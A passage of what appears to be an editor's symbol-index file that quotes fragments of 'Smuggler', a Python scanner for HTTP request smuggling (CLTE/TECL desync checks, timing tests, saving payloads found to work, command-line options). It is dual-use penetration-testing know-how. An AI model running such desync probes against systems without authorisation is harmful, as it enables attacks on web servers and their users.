        "peekOfCode": "\t\t\t\t_me = os.readlink(sys.argv[0])\n\t\t\telse:\n\t\t\t\t_me = sys.argv[0]\n\t\t\tfname = os.path.realpath(os.path.dirname(_me)) + \"/payloads/%s_%s_%s.txt\" % (furl,ptype,name)\n\t\t\tpretty_print(\"CRITICAL\", \"%s Payload: %s URL: %s\\n\" % \\\n\t\t\t(Fore.MAGENTA+ptype, Fore.CYAN+fname+Fore.MAGENTA, Fore.CYAN+self._url))\n\t\t\twith open(fname, 'wb') as file:\n\t\t\t\tfile.write(bytes(str(payload),'utf-8'))\n\t\t# First lets test TECL\n\t\tpretty_print(name, \"Checking TECL...\")",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\t\t_me",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t\t\t_me = sys.argv[0]\n\t\t\tfname = os.path.realpath(os.path.dirname(_me)) + \"/payloads/%s_%s_%s.txt\" % (furl,ptype,name)\n\t\t\tpretty_print(\"CRITICAL\", \"%s Payload: %s URL: %s\\n\" % \\\n\t\t\t(Fore.MAGENTA+ptype, Fore.CYAN+fname+Fore.MAGENTA, Fore.CYAN+self._url))\n\t\t\twith open(fname, 'wb') as file:\n\t\t\t\tfile.write(bytes(str(payload),'utf-8'))\n\t\t# First lets test TECL\n\t\tpretty_print(name, \"Checking TECL...\")\n\t\tstart_time = time.time()\n\t\ttecl_res = self._check_tecl(te_payload, 0)",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\tfname",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t\tfname = os.path.realpath(os.path.dirname(_me)) + \"/payloads/%s_%s_%s.txt\" % (furl,ptype,name)\n\t\t\tpretty_print(\"CRITICAL\", \"%s Payload: %s URL: %s\\n\" % \\\n\t\t\t(Fore.MAGENTA+ptype, Fore.CYAN+fname+Fore.MAGENTA, Fore.CYAN+self._url))\n\t\t\twith open(fname, 'wb') as file:\n\t\t\t\tfile.write(bytes(str(payload),'utf-8'))\n\t\t# First lets test TECL\n\t\tpretty_print(name, \"Checking TECL...\")\n\t\tstart_time = time.time()\n\t\ttecl_res = self._check_tecl(te_payload, 0)\n\t\ttecl_time = time.time()-start_time",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\tstart_time",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\tstart_time = time.time()\n\t\ttecl_res = self._check_tecl(te_payload, 0)\n\t\ttecl_time = time.time()-start_time\n\t\t# Next lets test CLTE\n\t\tpretty_print(name, \"Checking CLTE...\")\n\t\tstart_time = time.time()\n\t\tclte_res = self._check_clte(te_payload, 0)\n\t\tclte_time = time.time()-start_time\n\t\tif (clte_res[0] == 1):\n\t\t\t# Potential CLTE found",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\ttecl_res",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\ttecl_res = self._check_tecl(te_payload, 0)\n\t\ttecl_time = time.time()-start_time\n\t\t# Next lets test CLTE\n\t\tpretty_print(name, \"Checking CLTE...\")\n\t\tstart_time = time.time()\n\t\tclte_res = self._check_clte(te_payload, 0)\n\t\tclte_time = time.time()-start_time\n\t\tif (clte_res[0] == 1):\n\t\t\t# Potential CLTE found\n\t\t\t# Lets check the edge case to be sure",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\ttecl_time",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\ttecl_time = time.time()-start_time\n\t\t# Next lets test CLTE\n\t\tpretty_print(name, \"Checking CLTE...\")\n\t\tstart_time = time.time()\n\t\tclte_res = self._check_clte(te_payload, 0)\n\t\tclte_time = time.time()-start_time\n\t\tif (clte_res[0] == 1):\n\t\t\t# Potential CLTE found\n\t\t\t# Lets check the edge case to be sure\n\t\t\tclte_res2 = self._check_clte(te_payload, 1)",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\tstart_time",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\tstart_time = time.time()\n\t\tclte_res = self._check_clte(te_payload, 0)\n\t\tclte_time = time.time()-start_time\n\t\tif (clte_res[0] == 1):\n\t\t\t# Potential CLTE found\n\t\t\t# Lets check the edge case to be sure\n\t\t\tclte_res2 = self._check_clte(te_payload, 1)\n\t\t\tif clte_res2[0] == 0:\n\t\t\t\tself._attempts += 1\n\t\t\t\tif (self._attempts < 3):",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\tclte_res",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\tclte_res = self._check_clte(te_payload, 0)\n\t\tclte_time = time.time()-start_time\n\t\tif (clte_res[0] == 1):\n\t\t\t# Potential CLTE found\n\t\t\t# Lets check the edge case to be sure\n\t\t\tclte_res2 = self._check_clte(te_payload, 1)\n\t\t\tif clte_res2[0] == 0:\n\t\t\t\tself._attempts += 1\n\t\t\t\tif (self._attempts < 3):\n\t\t\t\t\treturn self._create_exec_test(name, te_payload)",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\tclte_time",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\tclte_time = time.time()-start_time\n\t\tif (clte_res[0] == 1):\n\t\t\t# Potential CLTE found\n\t\t\t# Lets check the edge case to be sure\n\t\t\tclte_res2 = self._check_clte(te_payload, 1)\n\t\t\tif clte_res2[0] == 0:\n\t\t\t\tself._attempts += 1\n\t\t\t\tif (self._attempts < 3):\n\t\t\t\t\treturn self._create_exec_test(name, te_payload)\n\t\t\t\telse:",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\tclte_res2",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t\tclte_res2 = self._check_clte(te_payload, 1)\n\t\t\tif clte_res2[0] == 0:\n\t\t\t\tself._attempts += 1\n\t\t\t\tif (self._attempts < 3):\n\t\t\t\t\treturn self._create_exec_test(name, te_payload)\n\t\t\t\telse:\n\t\t\t\t\tdismsg = Fore.RED + \"Potential CLTE Issue Found\" + Fore.MAGENTA + \" - \" + Fore.CYAN + self._method + Fore.MAGENTA + \" @ \" + Fore.CYAN + [\"http://\",\"https://\",][self.ssl_flag]+ self._host + self._endpoint + Fore.MAGENTA + \" - \" + Fore.CYAN + self._configfile.split('/')[-1] + \"\\n\"\n\t\t\t\t\tpretty_print(name, dismsg)\n\t\t\t\t\t# Write payload out to file\n\t\t\t\t\twrite_payload(self._host, clte_res[2], \"CLTE\")",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\t\t\tdismsg",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t\t\t\tdismsg = Fore.RED + \"Potential CLTE Issue Found\" + Fore.MAGENTA + \" - \" + Fore.CYAN + self._method + Fore.MAGENTA + \" @ \" + Fore.CYAN + [\"http://\",\"https://\",][self.ssl_flag]+ self._host + self._endpoint + Fore.MAGENTA + \" - \" + Fore.CYAN + self._configfile.split('/')[-1] + \"\\n\"\n\t\t\t\t\tpretty_print(name, dismsg)\n\t\t\t\t\t# Write payload out to file\n\t\t\t\t\twrite_payload(self._host, clte_res[2], \"CLTE\")\n\t\t\t\t\tself._attempts = 0\n\t\t\t\t\treturn True\n\t\t\telse:\n\t\t\t\t# No edge behavior found\n\t\t\t\tdismsg = Fore.YELLOW + \"CLTE TIMEOUT ON BOTH LENGTH 4 AND 11\" + [\"\\n\", \"\"][self._quiet]\n\t\t\t\tpretty_print(name, dismsg)",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\t\t\tself._attempts",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t\t\t\tself._attempts = 0\n\t\t\t\t\treturn True\n\t\t\telse:\n\t\t\t\t# No edge behavior found\n\t\t\t\tdismsg = Fore.YELLOW + \"CLTE TIMEOUT ON BOTH LENGTH 4 AND 11\" + [\"\\n\", \"\"][self._quiet]\n\t\t\t\tpretty_print(name, dismsg)\n\t\telif (tecl_res[0] == 1):\n\t\t\t# Potential TECL found\n\t\t\t# Lets check the edge case to be sure\n\t\t\ttecl_res2 = self._check_tecl(te_payload, 1)",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\t\tdismsg",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t\t\tdismsg = Fore.YELLOW + \"CLTE TIMEOUT ON BOTH LENGTH 4 AND 11\" + [\"\\n\", \"\"][self._quiet]\n\t\t\t\tpretty_print(name, dismsg)\n\t\telif (tecl_res[0] == 1):\n\t\t\t# Potential TECL found\n\t\t\t# Lets check the edge case to be sure\n\t\t\ttecl_res2 = self._check_tecl(te_payload, 1)\n\t\t\tif tecl_res2[0] == 0:\n\t\t\t\tself._attempts += 1\n\t\t\t\tif (self._attempts < 3):\n\t\t\t\t\treturn self._create_exec_test(name, te_payload)",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\ttecl_res2",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t\ttecl_res2 = self._check_tecl(te_payload, 1)\n\t\t\tif tecl_res2[0] == 0:\n\t\t\t\tself._attempts += 1\n\t\t\t\tif (self._attempts < 3):\n\t\t\t\t\treturn self._create_exec_test(name, te_payload)\n\t\t\t\telse:\n\t\t\t\t\t#print (str(tecl_res2[2]))\n\t\t\t\t\t#print (tecl_res2[1])\n\t\t\t\t\tdismsg = Fore.RED + \"Potential TECL Issue Found\" + Fore.MAGENTA + \" - \" + Fore.CYAN + self._method + Fore.MAGENTA + \" @ \" + Fore.CYAN + [\"http://\",\"https://\",][self.ssl_flag]+ self._host + self._endpoint + Fore.MAGENTA + \" - \" + Fore.CYAN + self._configfile.split('/')[-1] + \"\\n\"\n\t\t\t\t\tpretty_print(name, dismsg)",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\t\t\tdismsg",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t\t\t\tdismsg = Fore.RED + \"Potential TECL Issue Found\" + Fore.MAGENTA + \" - \" + Fore.CYAN + self._method + Fore.MAGENTA + \" @ \" + Fore.CYAN + [\"http://\",\"https://\",][self.ssl_flag]+ self._host + self._endpoint + Fore.MAGENTA + \" - \" + Fore.CYAN + self._configfile.split('/')[-1] + \"\\n\"\n\t\t\t\t\tpretty_print(name, dismsg)\n\t\t\t\t\t# Write payload out to file\n\t\t\t\t\twrite_payload(self._host, tecl_res[2], \"TECL\")\n\t\t\t\t\tself._attempts = 0\n\t\t\t\t\treturn True\n\t\t\telse:\n\t\t\t\t# No edge behavior found\n\t\t\t\tdismsg = Fore.YELLOW + \"TECL TIMEOUT ON BOTH LENGTH 6 AND 5\" + [\"\\n\", \"\"][self._quiet]\n\t\t\t\tpretty_print(name, dismsg)",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\t\t\tself._attempts",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t\t\t\tself._attempts = 0\n\t\t\t\t\treturn True\n\t\t\telse:\n\t\t\t\t# No edge behavior found\n\t\t\t\tdismsg = Fore.YELLOW + \"TECL TIMEOUT ON BOTH LENGTH 6 AND 5\" + [\"\\n\", \"\"][self._quiet]\n\t\t\t\tpretty_print(name, dismsg)\n\t\t#elif ((tecl_res[0] == 1) and (clte_res[0] == 1)):\n\t\t#\t# Both types of payloads not supported\n\t\t#\tdismsg = Fore.YELLOW + \"NOT SUPPORTED\" + [\"\\n\", \"\"][self._quiet]\n\t\t#\tpretty_print(name, dismsg)",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\t\tdismsg",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t\t\tdismsg = Fore.YELLOW + \"TECL TIMEOUT ON BOTH LENGTH 6 AND 5\" + [\"\\n\", \"\"][self._quiet]\n\t\t\t\tpretty_print(name, dismsg)\n\t\t#elif ((tecl_res[0] == 1) and (clte_res[0] == 1)):\n\t\t#\t# Both types of payloads not supported\n\t\t#\tdismsg = Fore.YELLOW + \"NOT SUPPORTED\" + [\"\\n\", \"\"][self._quiet]\n\t\t#\tpretty_print(name, dismsg)\n\t\telif ((tecl_res[0] == -1) or (clte_res[0] == -1)):\n\t\t\t# ERROR\n\t\t\tdismsg = Fore.YELLOW + \"SOCKET ERROR\" + [\"\\n\", \"\"][self._quiet]\n\t\t\tpretty_print(name, dismsg)",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t#\tdismsg",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t#\tdismsg = Fore.YELLOW + \"NOT SUPPORTED\" + [\"\\n\", \"\"][self._quiet]\n\t\t#\tpretty_print(name, dismsg)\n\t\telif ((tecl_res[0] == -1) or (clte_res[0] == -1)):\n\t\t\t# ERROR\n\t\t\tdismsg = Fore.YELLOW + \"SOCKET ERROR\" + [\"\\n\", \"\"][self._quiet]\n\t\t\tpretty_print(name, dismsg)\n\t\telif ((tecl_res[0] == 0) and (clte_res[0] == 0)):\n\t\t\t# No Desync Found\n\t\t\ttecl_msg = (Fore.MAGENTA + \" (TECL: \" + Fore.CYAN +\"%.2f\" + Fore.MAGENTA + \" - \" + \\\n\t\t\tFore.CYAN +\"%s\" + Fore.MAGENTA + \")\") % (tecl_time, tecl_res[1][9:9+3])",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\tdismsg",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t\tdismsg = Fore.YELLOW + \"SOCKET ERROR\" + [\"\\n\", \"\"][self._quiet]\n\t\t\tpretty_print(name, dismsg)\n\t\telif ((tecl_res[0] == 0) and (clte_res[0] == 0)):\n\t\t\t# No Desync Found\n\t\t\ttecl_msg = (Fore.MAGENTA + \" (TECL: \" + Fore.CYAN +\"%.2f\" + Fore.MAGENTA + \" - \" + \\\n\t\t\tFore.CYAN +\"%s\" + Fore.MAGENTA + \")\") % (tecl_time, tecl_res[1][9:9+3])\n\t\t\tclte_msg = (Fore.MAGENTA + \" (CLTE: \" + Fore.CYAN +\"%.2f\" + Fore.MAGENTA + \" - \" + \\\n\t\t\tFore.CYAN +\"%s\" + Fore.MAGENTA + \")\") % (clte_time, clte_res[1][9:9+3])\n\t\t\tdismsg = Fore.GREEN + \"OK\" + tecl_msg + clte_msg + [\"\\n\", \"\"][self._quiet]\n\t\t\tpretty_print(name, dismsg)",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\ttecl_msg",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t\ttecl_msg = (Fore.MAGENTA + \" (TECL: \" + Fore.CYAN +\"%.2f\" + Fore.MAGENTA + \" - \" + \\\n\t\t\tFore.CYAN +\"%s\" + Fore.MAGENTA + \")\") % (tecl_time, tecl_res[1][9:9+3])\n\t\t\tclte_msg = (Fore.MAGENTA + \" (CLTE: \" + Fore.CYAN +\"%.2f\" + Fore.MAGENTA + \" - \" + \\\n\t\t\tFore.CYAN +\"%s\" + Fore.MAGENTA + \")\") % (clte_time, clte_res[1][9:9+3])\n\t\t\tdismsg = Fore.GREEN + \"OK\" + tecl_msg + clte_msg + [\"\\n\", \"\"][self._quiet]\n\t\t\tpretty_print(name, dismsg)\n\t\telif ((tecl_res[0] == 2) or (clte_res[0] == 2)):\n\t\t\t# Disconnected\n\t\t\tdismsg = Fore.YELLOW + \"DISCONNECTED\" + [\"\\n\", \"\"][self._quiet]\n\t\t\tpretty_print(name, dismsg)",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\tclte_msg",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t\tclte_msg = (Fore.MAGENTA + \" (CLTE: \" + Fore.CYAN +\"%.2f\" + Fore.MAGENTA + \" - \" + \\\n\t\t\tFore.CYAN +\"%s\" + Fore.MAGENTA + \")\") % (clte_time, clte_res[1][9:9+3])\n\t\t\tdismsg = Fore.GREEN + \"OK\" + tecl_msg + clte_msg + [\"\\n\", \"\"][self._quiet]\n\t\t\tpretty_print(name, dismsg)\n\t\telif ((tecl_res[0] == 2) or (clte_res[0] == 2)):\n\t\t\t# Disconnected\n\t\t\tdismsg = Fore.YELLOW + \"DISCONNECTED\" + [\"\\n\", \"\"][self._quiet]\n\t\t\tpretty_print(name, dismsg)\n\t\tself._attempts = 0\n\t\treturn False",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\tdismsg",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t\tdismsg = Fore.GREEN + \"OK\" + tecl_msg + clte_msg + [\"\\n\", \"\"][self._quiet]\n\t\t\tpretty_print(name, dismsg)\n\t\telif ((tecl_res[0] == 2) or (clte_res[0] == 2)):\n\t\t\t# Disconnected\n\t\t\tdismsg = Fore.YELLOW + \"DISCONNECTED\" + [\"\\n\", \"\"][self._quiet]\n\t\t\tpretty_print(name, dismsg)\n\t\tself._attempts = 0\n\t\treturn False\ndef process_uri(uri):\n\tu = urlparse(uri)",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\tdismsg",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t\tdismsg = Fore.YELLOW + \"DISCONNECTED\" + [\"\\n\", \"\"][self._quiet]\n\t\t\tpretty_print(name, dismsg)\n\t\tself._attempts = 0\n\t\treturn False\ndef process_uri(uri):\n\tu = urlparse(uri)\n\tif u.scheme == \"https\":\n\t\tssl_flag = True\n\t\tstd_port = 443\n\telif u.scheme == \"http\":",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\tself._attempts",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\tself._attempts = 0\n\t\treturn False\ndef process_uri(uri):\n\tu = urlparse(uri)\n\tif u.scheme == \"https\":\n\t\tssl_flag = True\n\t\tstd_port = 443\n\telif u.scheme == \"http\":\n\t\tssl_flag = False\n\t\tstd_port = 80",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\tu",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\tu = urlparse(uri)\n\tif u.scheme == \"https\":\n\t\tssl_flag = True\n\t\tstd_port = 443\n\telif u.scheme == \"http\":\n\t\tssl_flag = False\n\t\tstd_port = 80\n\telse:\n\t\tprint_info(\"Error malformed URL not supported: %s\" % (Fore.CYAN + uri))\n\t\texit(1)",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\tssl_flag",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\tssl_flag = True\n\t\tstd_port = 443\n\telif u.scheme == \"http\":\n\t\tssl_flag = False\n\t\tstd_port = 80\n\telse:\n\t\tprint_info(\"Error malformed URL not supported: %s\" % (Fore.CYAN + uri))\n\t\texit(1)\n\tif u.port:\n\t\treturn (u.hostname, u.port, u.path, ssl_flag)",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\tstd_port",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\tstd_port = 443\n\telif u.scheme == \"http\":\n\t\tssl_flag = False\n\t\tstd_port = 80\n\telse:\n\t\tprint_info(\"Error malformed URL not supported: %s\" % (Fore.CYAN + uri))\n\t\texit(1)\n\tif u.port:\n\t\treturn (u.hostname, u.port, u.path, ssl_flag)\n\telse:",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\tssl_flag",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\tssl_flag = False\n\t\tstd_port = 80\n\telse:\n\t\tprint_info(\"Error malformed URL not supported: %s\" % (Fore.CYAN + uri))\n\t\texit(1)\n\tif u.port:\n\t\treturn (u.hostname, u.port, u.path, ssl_flag)\n\telse:\n\t\treturn (u.hostname, std_port, u.path, ssl_flag)\ndef CF(text):",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\tstd_port",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\tstd_port = 80\n\telse:\n\t\tprint_info(\"Error malformed URL not supported: %s\" % (Fore.CYAN + uri))\n\t\texit(1)\n\tif u.port:\n\t\treturn (u.hostname, u.port, u.path, ssl_flag)\n\telse:\n\t\treturn (u.hostname, std_port, u.path, ssl_flag)\ndef CF(text):\n\tglobal NOCOLOR",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\tansi_escape",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\tansi_escape = re.compile(r'\\x1B[@-_][0-?]*[ -/]*[@-~]')\n\t\ttext = ansi_escape.sub('', text)\n\treturn text\ndef banner(sm_version):\n\tprint(CF(Fore.CYAN))\n\tprint(CF(r\"  ______                         _              \"))\n\tprint(CF(r\" / _____)                       | |             \"))\n\tprint(CF(r\"( (____  ____  _   _  ____  ____| | _____  ____ \"))\n\tprint(CF(r\" \\____ \\|    \\| | | |/ _  |/ _  | || ___ |/ ___)\"))\n\tprint(CF(r\" _____) ) | | | |_| ( (_| ( (_| | || ____| |    \"))",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\ttext",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\ttext = ansi_escape.sub('', text)\n\treturn text\ndef banner(sm_version):\n\tprint(CF(Fore.CYAN))\n\tprint(CF(r\"  ______                         _              \"))\n\tprint(CF(r\" / _____)                       | |             \"))\n\tprint(CF(r\"( (____  ____  _   _  ____  ____| | _____  ____ \"))\n\tprint(CF(r\" \\____ \\|    \\| | | |/ _  |/ _  | || ___ |/ ___)\"))\n\tprint(CF(r\" _____) ) | | | |_| ( (_| ( (_| | || ____| |    \"))\n\tprint(CF(r\"(______/|_|_|_|____/ \\___ |\\___ |\\_)_____)_|    \"))",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\tansi_escape",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\tansi_escape = re.compile(r'\\x1B[@-_][0-?]*[ -/]*[@-~]')\n\tmsg = Style.BRIGHT + Fore.MAGENTA + \"[%s] %s\"%(Fore.CYAN+'+'+Fore.MAGENTA, msg) + Style.RESET_ALL\n\tplaintext = ansi_escape.sub('', msg)\n\tprint(CF(msg))\n\tif file_handle is not None:\n\t\tfile_handle.write(plaintext+\"\\n\")\nif __name__ == \"__main__\":\n\tglobal NOCOLOR\n\tif sys.version_info < (3, 0):\n\t\tprint(\"Error: Smuggler requires Python 3.x\")",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\tmsg",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\tmsg = Style.BRIGHT + Fore.MAGENTA + \"[%s] %s\"%(Fore.CYAN+'+'+Fore.MAGENTA, msg) + Style.RESET_ALL\n\tplaintext = ansi_escape.sub('', msg)\n\tprint(CF(msg))\n\tif file_handle is not None:\n\t\tfile_handle.write(plaintext+\"\\n\")\nif __name__ == \"__main__\":\n\tglobal NOCOLOR\n\tif sys.version_info < (3, 0):\n\t\tprint(\"Error: Smuggler requires Python 3.x\")\n\t\tsys.exit(1)",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\tplaintext",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\tplaintext = ansi_escape.sub('', msg)\n\tprint(CF(msg))\n\tif file_handle is not None:\n\t\tfile_handle.write(plaintext+\"\\n\")\nif __name__ == \"__main__\":\n\tglobal NOCOLOR\n\tif sys.version_info < (3, 0):\n\t\tprint(\"Error: Smuggler requires Python 3.x\")\n\t\tsys.exit(1)\n\tParser = argparse.ArgumentParser()",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\tParser",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\tParser = argparse.ArgumentParser()\n\tParser.add_argument('-u', '--url', help=\"Target URL with Endpoint\")\n\tParser.add_argument('-v', '--vhost', default=\"\", help=\"Specify a virtual host\")\n\tParser.add_argument('-x', '--exit_early', action='store_true',help=\"Exit scan on first finding\")\n\tParser.add_argument('-m', '--method', default=\"POST\", help=\"HTTP method to use (e.g GET, POST) Default: POST\")\n\tParser.add_argument('-l', '--log', help=\"Specify a log file\")\n\tParser.add_argument('-q', '--quiet', action='store_true', help=\"Quiet mode will only log issues found\")\n\tParser.add_argument('-t', '--timeout', default=5.0, help=\"Socket timeout value Default: 5\")\n\tParser.add_argument('--no-color', action='store_true', help=\"Suppress color codes\")\n\tParser.add_argument('-c', '--configfile', default=\"default.py\", help=\"Filepath to the configuration file of payloads\")",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\tArgs",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\tArgs = Parser.parse_args()  # returns data from the options specified (echo)\n\tNOCOLOR = Args.no_color\n\tif os.name == 'nt':\n\t\tNOCOLOR = True\n\tVersion = \"v1.1\"\n\tbanner(Version)\n\tif sys.version_info < (3, 0):\n\t\tprint_info(\"Error: Smuggler requires Python 3.x\")\n\t\tsys.exit(1)\n\t# If the URL argument is not specified then check stdin",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\tNOCOLOR",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\tNOCOLOR = Args.no_color\n\tif os.name == 'nt':\n\t\tNOCOLOR = True\n\tVersion = \"v1.1\"\n\tbanner(Version)\n\tif sys.version_info < (3, 0):\n\t\tprint_info(\"Error: Smuggler requires Python 3.x\")\n\t\tsys.exit(1)\n\t# If the URL argument is not specified then check stdin\n\tif Args.url is None:",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\tNOCOLOR",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\tNOCOLOR = True\n\tVersion = \"v1.1\"\n\tbanner(Version)\n\tif sys.version_info < (3, 0):\n\t\tprint_info(\"Error: Smuggler requires Python 3.x\")\n\t\tsys.exit(1)\n\t# If the URL argument is not specified then check stdin\n\tif Args.url is None:\n\t\tif sys.stdin.isatty():\n\t\t\tprint_info(\"Error: no direct URL or piped URL specified\\n\")",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\tVersion",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\tVersion = \"v1.1\"\n\tbanner(Version)\n\tif sys.version_info < (3, 0):\n\t\tprint_info(\"Error: Smuggler requires Python 3.x\")\n\t\tsys.exit(1)\n\t# If the URL argument is not specified then check stdin\n\tif Args.url is None:\n\t\tif sys.stdin.isatty():\n\t\t\tprint_info(\"Error: no direct URL or piped URL specified\\n\")\n\t\t\tParser.print_help()",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\tServers",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
